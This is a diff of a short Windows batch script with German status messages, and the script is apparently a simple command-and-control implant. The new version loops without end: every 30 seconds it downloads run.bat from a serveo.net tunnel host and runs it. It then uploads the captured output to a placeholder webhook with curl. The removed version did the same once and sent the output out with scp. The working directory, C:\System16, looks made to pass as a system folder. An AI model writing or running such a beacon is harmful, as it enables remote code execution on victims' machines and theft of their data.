@@ -1,16 +1,19 @@
 @echo off
-cd C:\System64\
-curl http://your_hostname.serveo.net/input.txt -o input.txt
-set INPUT_FILE=input.txt
+:start
+cd C:\System16\
 set OUTPUT_FILE=output.txt
+curl http://your_hostname.serveo.net/run.bat -o C:\System16\run.bat
 
-if not exist %INPUT_FILE% (
-    echo %INPUT_FILE% not found
-    exit /b
-)
+call C:\System16\run.bat > %OUTPUT_FILE% 2>&1
 
-set /p BATCH_SCRIPT=<%INPUT_FILE%
-call %BATCH_SCRIPT% > %OUTPUT_FILE% 3>&1
+echo -----------------------------------------
+echo Ausführung abgeschlossen. Der Output wurde in %OUTPUT_FILE% gespeichert.
 
-cmd.exe /c "scp  "C:\System64\output.txt" user@your_hostname:/mnt/income/output.txt"
-Rem adapt your username and hostname here
+
+set WEBHOOK_URL=<YOUR WEBHOOK URL>
+set DATEIPFAD=C:\System16\output.txt
+curl -X POST -H "Content-Type: multipart/form-data"  -F "file=@%DATEIPFAD%" %WEBHOOK_URL%
+
+
+timeout 30
+goto start
